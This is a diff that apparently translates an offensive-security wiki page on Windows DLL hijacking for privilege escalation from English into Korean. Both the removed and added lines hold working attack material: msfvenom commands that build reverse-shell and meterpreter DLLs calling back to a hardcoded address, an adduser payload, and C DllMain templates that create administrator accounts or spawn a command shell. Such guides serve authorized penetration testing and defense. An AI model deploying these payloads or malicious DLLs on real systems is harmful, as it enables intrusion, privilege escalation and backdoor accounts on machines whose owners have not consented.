@@ -10,166 +10,152 @@
 
 ## Basic Information
 
-DLL Hijacking involves manipulating a trusted application into loading a malicious DLL. This term encompasses several tactics like **DLL Spoofing, Injection, and Side-Loading**. It's mainly utilized for code execution, achieving persistence, and, less commonly, privilege escalation. Despite the focus on escalation here, the method of hijacking remains consistent across objectives.
+DLL Hijacking은 신뢰할 수 있는 애플리케이션이 악성 DLL을 로드하도록 조작하는 것입니다. 이 용어는 **DLL Spoofing, Injection, and Side-Loading**과 같은 여러 전술을 포함합니다. 주로 코드 실행, 지속성 달성 및 덜 일반적으로 권한 상승을 위해 사용됩니다. 여기서 상승에 초점을 맞추고 있지만, 하이재킹 방법은 목표에 관계없이 일관됩니다.
 
 ### Common Techniques
 
-Several methods are employed for DLL hijacking, each with its effectiveness depending on the application's DLL loading strategy:
+DLL 하이재킹을 위해 여러 방법이 사용되며, 각 방법은 애플리케이션의 DLL 로딩 전략에 따라 효과가 다릅니다:
 
-1. **DLL Replacement**: Swapping a genuine DLL with a malicious one, optionally using DLL Proxying to preserve the original DLL's functionality.
-2. **DLL Search Order Hijacking**: Placing the malicious DLL in a search path ahead of the legitimate one, exploiting the application's search pattern.
-3. **Phantom DLL Hijacking**: Creating a malicious DLL for an application to load, thinking it's a non-existent required DLL.
-4. **DLL Redirection**: Modifying search parameters like `%PATH%` or `.exe.manifest` / `.exe.local` files to direct the application to the malicious DLL.
-5. **WinSxS DLL Replacement**: Substituting the legitimate DLL with a malicious counterpart in the WinSxS directory, a method often associated with DLL side-loading.
-6. **Relative Path DLL Hijacking**: Placing the malicious DLL in a user-controlled directory with the copied application, resembling Binary Proxy Execution techniques.
+1. **DLL Replacement**: 진짜 DLL을 악성 DLL로 교체하며, 원래 DLL의 기능을 유지하기 위해 DLL Proxying을 선택적으로 사용할 수 있습니다.
+2. **DLL Search Order Hijacking**: 악성 DLL을 합법적인 DLL보다 앞서 검색 경로에 배치하여 애플리케이션의 검색 패턴을 악용합니다.
+3. **Phantom DLL Hijacking**: 애플리케이션이 로드할 악성 DLL을 생성하여 존재하지 않는 필수 DLL로 착각하게 만듭니다.
+4. **DLL Redirection**: `%PATH%` 또는 `.exe.manifest` / `.exe.local` 파일과 같은 검색 매개변수를 수정하여 애플리케이션이 악성 DLL을 가리키도록 합니다.
+5. **WinSxS DLL Replacement**: WinSxS 디렉토리에서 합법적인 DLL을 악성 DLL로 대체하는 방법으로, 종종 DLL 사이드 로딩과 관련이 있습니다.
+6. **Relative Path DLL Hijacking**: 복사된 애플리케이션과 함께 사용자 제어 디렉토리에 악성 DLL을 배치하여 Binary Proxy Execution 기술과 유사하게 만듭니다.
 
 ## Finding missing Dlls
 
-The most common way to find missing Dlls inside a system is running [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) from sysinternals, **setting** the **following 2 filters**:
+시스템 내에서 누락된 DLL을 찾는 가장 일반적인 방법은 sysinternals에서 [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon)을 실행하고 **다음 2개의 필터를 설정**하는 것입니다:
 
 ![](<../../images/image (311).png>)
 
 ![](<../../images/image (313).png>)
 
-and just show the **File System Activity**:
+그리고 **파일 시스템 활동**만 표시합니다:
 
 ![](<../../images/image (314).png>)
 
-If you are looking for **missing dlls in general** you **leave** this running for some **seconds**.\
-If you are looking for a **missing dll inside an specific executable** you should set **another filter like "Process Name" "contains" "\<exec name>", execute it, and stop capturing events**.
+**일반적으로 누락된 dll을 찾고 있다면** 몇 **초** 동안 이 상태로 두십시오.\
+**특정 실행 파일 내에서 누락된 dll을 찾고 있다면** **"Process Name" "contains" "\<exec name>"**와 같은 **다른 필터를 설정하고 실행한 후 이벤트 캡처를 중지해야** 합니다.
 
 ## Exploiting Missing Dlls
 
-In order to escalate privileges, the best chance we have is to be able to **write a dll that a privilege process will try to load** in some of **place where it is going to be searched**. Therefore, we will be able to **write** a dll in a **folder** where the **dll is searched before** the folder where the **original dll** is (weird case), or we will be able to **write on some folder where the dll is going to be searched** and the original **dll doesn't exist** on any folder.
+권한을 상승시키기 위해, 우리가 가질 수 있는 최선의 기회는 **특권 프로세스가 로드하려고 시도할 DLL을 작성할 수 있는 것**입니다. 따라서, 우리는 **원래 DLL**이 있는 폴더보다 **먼저 검색되는 폴더**에 DLL을 **작성**할 수 있거나, **DLL이 검색될 폴더**에 **작성**할 수 있으며, 원래 **DLL이 어떤 폴더에도 존재하지 않는 경우**입니다.
 
 ### Dll Search Order
 
-**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**
+**Microsoft 문서** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **에서 DLL이 어떻게 로드되는지 구체적으로 확인할 수 있습니다.**
 
-**Windows applications** look for DLLs by following a set of **pre-defined search paths**, adhering to a particular sequence. The issue of DLL hijacking arises when a harmful DLL is strategically placed in one of these directories, ensuring it gets loaded before the authentic DLL. A solution to prevent this is to ensure the application uses absolute paths when referring to the DLLs it requires.
+**Windows 애플리케이션**은 특정 순서를 따르는 **미리 정의된 검색 경로**를 따라 DLL을 찾습니다. DLL 하이재킹 문제는 해로운 DLL이 이러한 디렉토리 중 하나에 전략적으로 배치되어 진짜 DLL보다 먼저 로드되도록 할 때 발생합니다. 이를 방지하기 위한 해결책은 애플리케이션이 필요한 DLL을 참조할 때 절대 경로를 사용하도록 하는 것입니다.
 
-You can see the **DLL search order on 32-bit** systems below:
+32비트 시스템에서의 **DLL 검색 순서**는 다음과 같습니다:
 
-1. The directory from which the application loaded.
-2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
-3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
-4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
-   1. (_C:\Windows_)
-5. The current directory.
-6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.
+1. 애플리케이션이 로드된 디렉토리.
+2. 시스템 디렉토리. 이 디렉토리의 경로를 얻으려면 [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) 함수를 사용하십시오.(_C:\Windows\System32_)
+3. 16비트 시스템 디렉토리. 이 디렉토리의 경로를 얻는 함수는 없지만 검색됩니다. (_C:\Windows\System_)
+4. Windows 디렉토리. 이 디렉토리의 경로를 얻으려면 [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) 함수를 사용하십시오. (_C:\Windows_)
+5. 현재 디렉토리.
+6. PATH 환경 변수에 나열된 디렉토리. 여기에는 **App Paths** 레지스트리 키에 의해 지정된 애플리케이션별 경로가 포함되지 않습니다. **App Paths** 키는 DLL 검색 경로를 계산할 때 사용되지 않습니다.
 
-That is the **default** search order with **SafeDllSearchMode** enabled. When it's disabled the current directory escalates to second place. To disable this feature, create the **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value and set it to 0 (default is enabled).
+이것이 **SafeDllSearchMode**가 활성화된 상태에서의 **기본** 검색 순서입니다. 비활성화되면 현재 디렉토리가 두 번째 위치로 상승합니다. 이 기능을 비활성화하려면 **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** 레지스트리 값을 생성하고 0으로 설정하십시오(기본값은 활성화됨).
 
-If [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function is called with **LOAD_WITH_ALTERED_SEARCH_PATH** the search begins in the directory of the executable module that **LoadLibraryEx** is loading.
+[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) 함수가 **LOAD_WITH_ALTERED_SEARCH_PATH**로 호출되면 검색은 **LoadLibraryEx**가 로드하는 실행 모듈의 디렉토리에서 시작됩니다.
 
-Finally, note that **a dll could be loaded indicating the absolute path instead just the name**. In that case that dll is **only going to be searched in that path** (if the dll has any dependencies, they are going to be searched as just loaded by name).
+마지막으로, **DLL은 이름 대신 절대 경로를 지정하여 로드될 수 있습니다**. 이 경우 해당 DLL은 **그 경로에서만 검색됩니다**(DLL에 종속성이 있는 경우, 종속성은 이름으로만 로드된 것으로 검색됩니다).
 
-There are other ways to alter the ways to alter the search order but I'm not going to explain them here.
+검색 순서를 변경하는 다른 방법이 있지만 여기서는 설명하지 않겠습니다.
 
 #### Exceptions on dll search order from Windows docs
 
-Certain exceptions to the standard DLL search order are noted in Windows documentation:
+Windows 문서에서 표준 DLL 검색 순서에 대한 특정 예외가 언급됩니다:
 
-- When a **DLL that shares its name with one already loaded in memory** is encountered, the system bypasses the usual search. Instead, it performs a check for redirection and a manifest before defaulting to the DLL already in memory. **In this scenario, the system does not conduct a search for the DLL**.
-- In cases where the DLL is recognized as a **known DLL** for the current Windows version, the system will utilize its version of the known DLL, along with any of its dependent DLLs, **forgoing the search process**. The registry key **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** holds a list of these known DLLs.
-- Should a **DLL have dependencies**, the search for these dependent DLLs is conducted as though they were indicated only by their **module names**, regardless of whether the initial DLL was identified through a full path.
+- **메모리에 이미 로드된 DLL과 이름이 같은 DLL**이 발견되면 시스템은 일반 검색을 우회합니다. 대신 리디렉션 및 매니페스트를 확인한 후 메모리에 이미 있는 DLL로 기본 설정합니다. **이 시나리오에서는 시스템이 DLL 검색을 수행하지 않습니다**.
+- DLL이 현재 Windows 버전의 **알려진 DLL**로 인식되는 경우, 시스템은 검색 프로세스를 생략하고 알려진 DLL의 버전과 해당 종속 DLL을 사용합니다. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**는 이러한 알려진 DLL의 목록을 보유합니다.
+- **DLL에 종속성이 있는 경우**, 이러한 종속 DLL의 검색은 초기 DLL이 전체 경로를 통해 식별되었는지 여부에 관계없이 **모듈 이름**으로만 표시된 것처럼 수행됩니다.
 
 ### Escalating Privileges
 
 **Requirements**:
 
-- Identify a process that operates or will operate under **different privileges** (horizontal or lateral movement), which is **lacking a DLL**.
-- Ensure **write access** is available for any **directory** in which the **DLL** will be **searched for**. This location might be the directory of the executable or a directory within the system path.
+- **다른 권한**(수평 또는 측면 이동)으로 작동하거나 작동할 **프로세스**를 식별하고, **DLL**이 **누락된** 상태여야 합니다.
+- **DLL**이 **검색될** **디렉토리**에 대한 **쓰기 권한**이 있어야 합니다. 이 위치는 실행 파일의 디렉토리일 수도 있고 시스템 경로 내의 디렉토리일 수도 있습니다.
 
-Yeah, the requisites are complicated to find as **by default it's kind of weird to find a privileged executable missing a dll** and it's even **more weird to have write permissions on a system path folder** (you can't by default). But, in misconfigured environments this is possible.\
-In the case you are lucky and you find yourself meeting the requirements, you could check the [UACME](https://github.com/hfiref0x/UACME) project. Even if the **main goal of the project is bypass UAC**, you may find there a **PoC** of a Dll hijaking for the Windows version that you can use (probably just changing the path of the folder where you have write permissions).
+네, 기본적으로 **특권 실행 파일이 DLL이 누락된 상태를 찾는 것은 다소 이상하기 때문에** 요구 사항을 찾는 것이 복잡합니다. 그리고 **시스템 경로 폴더에 쓰기 권한을 갖는 것은 기본적으로 불가능합니다**. 그러나 잘못 구성된 환경에서는 가능합니다.\
+운이 좋다면 요구 사항을 충족하는 경우 [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인할 수 있습니다. **프로젝트의 주요 목표가 UAC 우회를 위한 것이지만**, 사용할 수 있는 Windows 버전의 DLL 하이재킹 **PoC**를 찾을 수 있습니다(아마도 쓰기 권한이 있는 폴더의 경로만 변경하면 됩니다).
 
-Note that you can **check your permissions in a folder** doing:
-
+폴더에서 **권한을 확인할 수 있습니다**:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-
-And **check permissions of all folders inside PATH**:
-
+모든 폴더의 **권한을 확인하십시오 PATH**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-
-You can also check the imports of an executable and the exports of a dll with:
-
+실행 파일의 임포트와 DLL의 익스포트를 확인할 수도 있습니다:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-
-For a full guide on how to **abuse Dll Hijacking to escalate privileges** with permissions to write in a **System Path folder** check:
+전체 가이드는 **System Path 폴더에 쓰기 권한을 이용한 Dll Hijacking 악용 방법**을 확인하세요:
 
 {{#ref}}
 dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md
 {{#endref}}
 
-### Automated tools
+### 자동화 도구
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)will check if you have write permissions on any folder inside system PATH.\
-Other interesting automated tools to discover this vulnerability are **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ and _Write-HijackDll._
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 시스템 PATH 내의 어떤 폴더에 쓰기 권한이 있는지 확인합니다.\
+이 취약점을 발견하기 위한 다른 흥미로운 자동화 도구는 **PowerSploit 함수**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ 및 _Write-HijackDll_입니다.
 
-### Example
+### 예시
 
-In case you find an exploitable scenario one of the most important things to successfully exploit it would be to **create a dll that exports at least all the functions the executable will import from it**. Anyway, note that Dll Hijacking comes handy in order to [escalate from Medium Integrity level to High **(bypassing UAC)**](../authentication-credentials-uac-and-efs.md#uac) or from[ **High Integrity to SYSTEM**](./#from-high-integrity-to-system)**.** You can find an example of **how to create a valid dll** inside this dll hijacking study focused on dll hijacking for execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Moreover, in the **next sectio**n you can find some **basic dll codes** that might be useful as **templates** or to create a **dll with non required functions exported**.
+악용 가능한 시나리오를 발견한 경우, 성공적으로 악용하기 위해 가장 중요한 것 중 하나는 **실행 파일이 가져올 모든 함수를 내보내는 dll을 생성하는 것**입니다. 어쨌든, Dll Hijacking은 [**Medium Integrity 레벨에서 High로 (UAC 우회)**](../authentication-credentials-uac-and-efs.md#uac) 또는 [**High Integrity에서 SYSTEM으로**](./#from-high-integrity-to-system)**.**로 상승하는 데 유용하다는 점에 유의하세요. **유효한 dll을 생성하는 방법**에 대한 예시는 이 dll hijacking 연구에서 찾을 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+또한, **다음 섹션**에서는 **템플릿**으로 유용할 수 있는 **기본 dll 코드**를 찾을 수 있습니다.
 
-## **Creating and compiling Dlls**
+## **Dll 생성 및 컴파일**
 
-### **Dll Proxifying**
+### **Dll 프록시화**
 
-Basically a **Dll proxy** is a Dll capable of **execute your malicious code when loaded** but also to **expose** and **work** as **exected** by **relaying all the calls to the real library**.
+기본적으로 **Dll 프록시**는 **로드될 때 악성 코드를 실행할 수 있는 Dll**이지만, **실제 라이브러리에 대한 모든 호출을 중계하여** **노출**하고 **작동**하는 Dll입니다.
 
-With the tool [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) or [**Spartacus**](https://github.com/Accenture/Spartacus) you can actually **indicate an executable and select the library** you want to proxify and **generate a proxified dll** or **indicate the Dll** and **generate a proxified dll**.
+[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 **실행 파일을 지정하고 프록시화할 라이브러리를 선택하여** **프록시화된 dll을 생성**하거나 **Dll을 지정하고 프록시화된 dll을 생성**할 수 있습니다.
 
 ### **Meterpreter**
 
-**Get rev shell (x64):**
-
+**rev shell 가져오기 (x64):**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-
-**Get a meterpreter (x86):**
-
+**미터프리터 얻기 (x86):**
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-
-**Create a user (x86 I didn't see a x64 version):**
-
+**사용자 생성 (x86 버전만 확인됨, x64 버전은 없음):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
+### 당신의 것
 
-### Your own
-
-Note that in several cases the Dll that you compile must **export several functions** that are going to be loaded by the victim process, if these functions doesn't exist the **binary won't be able to load** them and the **exploit will fail**.
-
+여러 경우에 컴파일한 Dll은 **희생 프로세스에 의해 로드될 여러 함수를 내보내야** 한다는 점에 유의하십시오. 이러한 함수가 존재하지 않으면 **바이너리가** 이를 로드할 수 없으며 **익스플로잇이 실패**합니다.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
 #include <windows.h>
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
-    switch(dwReason){
-        case DLL_PROCESS_ATTACH:
-            system("whoami > C:\\users\\username\\whoami.txt");
-            WinExec("calc.exe", 0); //This doesn't accept redirections like system
-            break;
-        case DLL_PROCESS_DETACH:
-            break;
-        case DLL_THREAD_ATTACH:
-            break;
-        case DLL_THREAD_DETACH:
-            break;
-    }
-    return TRUE;
+switch(dwReason){
+case DLL_PROCESS_ATTACH:
+system("whoami > C:\\users\\username\\whoami.txt");
+WinExec("calc.exe", 0); //This doesn't accept redirections like system
+break;
+case DLL_PROCESS_DETACH:
+break;
+case DLL_THREAD_ATTACH:
+break;
+case DLL_THREAD_DETACH:
+break;
+}
+return TRUE;
 }
 ```
 
@@ -179,11 +165,11 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 
 #include <windows.h>
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
-    if (dwReason == DLL_PROCESS_ATTACH){
-        system("cmd.exe /k net localgroup administrators user /add");
-        ExitProcess(0);
-    }
-    return TRUE;
+if (dwReason == DLL_PROCESS_ATTACH){
+system("cmd.exe /k net localgroup administrators user /add");
+ExitProcess(0);
+}
+return TRUE;
 }
 ```
 
@@ -195,15 +181,15 @@ BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
 
 int owned()
 {
-  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
-  exit(0);
-  return 0;
+WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
+exit(0);
+return 0;
 }
 
 BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 {
-  owned();
-  return 0;
+owned();
+return 0;
 }
 ```
 
@@ -216,23 +202,22 @@ BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
 #include<stdio.h>
 
 void Entry (){ //Default function that is executed when the DLL is loaded
-    system("cmd");
+system("cmd");
 }
 
 BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
-    switch (ul_reason_for_call){
-        case DLL_PROCESS_ATTACH:
-            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
-            break;
-        case DLL_THREAD_ATTACH:
-        case DLL_THREAD_DETACH:
-        case DLL_PROCESS_DEATCH:
-            break;
-    }
-    return TRUE;
+switch (ul_reason_for_call){
+case DLL_PROCESS_ATTACH:
+CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
+break;
+case DLL_THREAD_ATTACH:
+case DLL_THREAD_DETACH:
+case DLL_PROCESS_DEATCH:
+break;
+}
+return TRUE;
 }
 ```
-
 ## References
 
 - [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
@@ -240,9 +225,8 @@ BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReser
 
 <figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**버그 바운티 팁**: **가입하세요** **Intigriti**에, 해커를 위해 해커가 만든 프리미엄 **버그 바운티 플랫폼**! 오늘 [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks)에서 저희와 함께하고 최대 **$100,000**의 보상을 받기 시작하세요!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
